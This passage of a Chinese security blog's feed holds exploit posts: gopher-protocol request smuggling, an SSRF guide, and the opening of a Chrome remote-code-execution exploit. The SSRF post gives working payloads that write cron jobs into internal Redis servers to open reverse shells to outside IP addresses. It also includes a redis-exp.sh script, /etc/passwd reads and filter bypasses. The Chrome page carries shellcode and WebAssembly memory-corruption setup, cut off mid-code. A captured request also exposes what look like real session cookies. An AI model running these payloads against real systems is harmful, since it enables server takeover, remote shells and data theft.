gopher://www.example.com/path/_[file]curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere</code></pre><p><a id="orgd7c10bf"></a></p><h2 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h2><pre><code>    GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><ol><li><p>URL全编码1次HTTP请求包</p><p> <code>%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a</code></p></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210506104027urlencode_all.png" alt="img"></p><ol><li> 将URL全编码后的HTTP请求包的字符串附加到`_`后</li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a    ❯ nc -lvv 70      GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><p><a id="org085483d"></a></p><h2 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h2><p>必须参数`POST`、`Host`、`Content-Type`、`Content-Length`、、</p><pre><code>POST /v1/pages HTTP/2Host: content-autofill.googleapis.comX-Goog-Encode-Response-If-Executable: base64X-Goog-Api-Key: dummytokenX-Client-Data: COrfygE=Sec-Fetch-Site: noneSec-Fetch-Mode: no-corsSec-Fetch-Dest: emptyUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 9alt=proto</code></pre><ol><li><p> URL全编码HTTP请求包</p></li><li><p> 将URL全编码后的HTTP请求包的字符串附加到`_`后</p></li></ol><pre><code class="zsh">    curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f    ❯ nc -lvv 70    POST /v1/pages HTTP/2    Host: content-autofill.googleapis.com    X-Goog-Encode-Response-If-Executable: base64    X-Goog-Api-Key: dummytoken    X-Client-Data: COrfygE=    Sec-Fetch-Site: none    Sec-Fetch-Mode: no-cors    Sec-Fetch-Dest: empty    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Connection: close    Content-Type: application/x-www-form-urlencoded    Content-Length: 9    alt=proto</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; clas</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="https://askding.github.io/Kali/Exploit/SSRF.html"/>
    <id>https://askding.github.io/Kali/Exploit/SSRF.html</id>
    <published>2021-04-19T07:03:37.000Z</published>
    <updated>2021-04-19T07:03:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>靶机环境 <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p><a href="https://github.com/hongriSec/Web-Security-Attack">https://github.com/hongriSec/Web-Security-Attack</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p><a href="https://www.anquanke.com/post/id/197431">https://www.anquanke.com/post/id/197431</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p><a href="https://segmentfault.com/a/1190000021960060">https://segmentfault.com/a/1190000021960060</a></p><p>https://<em>thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de</em>.html</p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p>能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）</p><p><a href="https://joner11234.github.io/article/9d7d2c7d.html">https://joner11234.github.io/article/9d7d2c7d.html</a></p><p><a href="https://joner11234.github.io/article/9897b513.html">https://joner11234.github.io/article/9897b513.html</a></p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>工具 ：<a href="http://xip.io/">http://xip.io/</a><br><a href="http://xip.name/">http://xip.name</a></p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>请求中常用参数share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><p><img src="https://raw.githubusercontent.com/crkmythical/Advanced-Ethical-Hacking-Training/main/Resource/img/20210419144323urlencode_all.png?token=ATXUKW6VO2E3WA5DV2YM6ITAPUTNK" alt="SSRF"></p><pre><code class="zsh"># dict protocol (操作Redis)curl -vvv &#39;dict://127.0.0.1:6379/info&#39;# file protocol (任意文件读取)curl -vvv &#39;file:///etc/passwd&#39;# gopher protocol (一键反弹Bash)   * 注意: 链接使用单引号，避免$变量问题curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><h2 id="协议使用"><a href="#协议使用" class="headerlink" title="协议使用"></a>协议使用</h2><p>（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&#39;</code></pre><p>（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/&#39;</code></pre><p>（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>反弹shell脚本<code>redis-exp.sh</code></p><pre><code class="zsh">redis-cli -h $1 flushallecho -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.20/7777 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save</code></pre><p>在本级上上运行socat查看执行的命令</p><pre><code class="zsh">socat -v tcp-listen:4444,fork tcp-connect:10.211.55.4:6379   # 10.211.55.4 为目标机sh redis-exp.sh</code></pre><p>socat会输出 redis-exp 执行的内容</p><pre><code class="zsh">*3\r$3\rset\r$1\r1\r$65\r-e */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.26/7777 0&gt;&amp;1\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$16\r/var/spool/cron/\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r*1\r$4\rsave\r*1\r$4\rquit\r^C%                       ``````zshcurl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p>（4）http/s：探测内网主机存活</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1&#39;</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><ul><li><input disabled="" type="checkbox"> 针对<code>Host</code></li></ul><pre><code class="zsh">1. http://www.target.com@10.10.10.10  -&gt;10.10.10.102. http://10.10.10.10#www.target.com  -&gt;10.10.10.103. 10。10。10。10                     -&gt; 10.10.10.103. xip.io &amp; xip.name4. tinyurl.com6. ip编码绕过7. [DNS Rebinding](https://github.com/Tr3jer/dnsAutoRebinding)</code></pre><h2 id="SSRF探测内网Redis服务-burp-intruder"><a href="#SSRF探测内网Redis服务-burp-intruder" class="headerlink" title="SSRF探测内网Redis服务(burp intruder)"></a>SSRF探测内网Redis服务(burp intruder)</h2><ol><li><p> 利用http协议对内网进行探测，探测整个内网的存活ip， <code>curl http://www.target.com/ssrf.php?url=http://172.16.x.x</code></p></li><li><p> 利用dict协议获取存活ip的6379端口banner信息 <code>curl http://www.target.com/ssrf.php?url=dict://172.16.55.23:6379/info</code></p></li><li><p>利用crontab写计划任务</p><ol><li><p>URL全编码以下payload</p><pre><code class="zsh">testset 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n\n\n\n&quot;config set dir /var/spool/root     config set dbfilename crontabsaveaaa</code></pre></li><li><p>使用gopher协议发送payload</p><p>```zsh<br>curl <a href="http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E&%20/dev/tcp/lQip/%EF%BF%BD,%EF%BF%BD%EF%BF%BD%200%3E&1%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20/tmp%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa">http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%74%65%73%74%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%6c%51%69%70%2f%d1%2c%ef%e3%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%74%6d%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a%0d%0a%61%61%61</a></p></li></ol><p> +OK<br> +OK<br> +OK<br> +OK</p><pre><code>2.  通过[Gopherus](https://github.com/tarunkant/Gopherus)生成RESP格式的payload```zshpython gopherus.py --exploit redisYour gopher link is ready to get Reverse Shell:gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234`</code></pre></li></ol><p>工具<br><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a><br><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;靶机环境 &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/maste</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome_0day_RCE_no_sandbox</title>
    <link href="https://askding.github.io/Kali/Exploit/Chrome-0day-RCE-no-sandbox.html"/>
    <id>https://askding.github.io/Kali/Exploit/Chrome-0day-RCE-no-sandbox.html</id>
    <published>2021-04-15T07:20:17.000Z</published>
    <updated>2021-04-15T07:20:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="exp-html-sample"><a href="#exp-html-sample" class="headerlink" title="exp.html sample"></a>exp.html sample</h2><pre><code class="javascript">&lt;script&gt;   function gc() &#123;       for (var i = 0; i &lt; 0x80000; ++i) &#123;           var a = new ArrayBuffer();      &#125;  &#125;  // replace the shellcode with cs&#39;payload generate as c format    let shellcode = [          0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,       0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,       0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,       0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,       0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,       0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,       0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,       0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,       0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,       0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,       0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,       0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,       0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,       0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,       0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,       0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,       0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,       0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00       ];   var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);   var wasmModule = new WebAssembly.Module(wasmCode);   var wasmInstance = new WebAssembly.Instance(wasmModule);   var main = wasmInstance.exports.main;   var bf = new ArrayBuffer(8);   var bfView = new DataView(bf);   function fLow(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(0, true));  &#125;   function fHi(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(4, true))  &#125;   function i2f(low, hi) &#123;       bfView.setUint32(0, low, true);       bfView.setUint32(4, hi, true);       return bfView.getFloat64(0, true);  &#125;   function f2big(f) &#123;       bfView.setFloat64(0, f, true);       return bfView.getBigUint64(0, true);  &#125;   function big2f(b) &#123;       bfView.setBigUint64(0, b, true);       return bfView.getFloat64(0, true);  &#125;   class LeakArrayBuffer extends ArrayBuffer &#123;       constructor(size) &#123;           super(size);           this.slot = 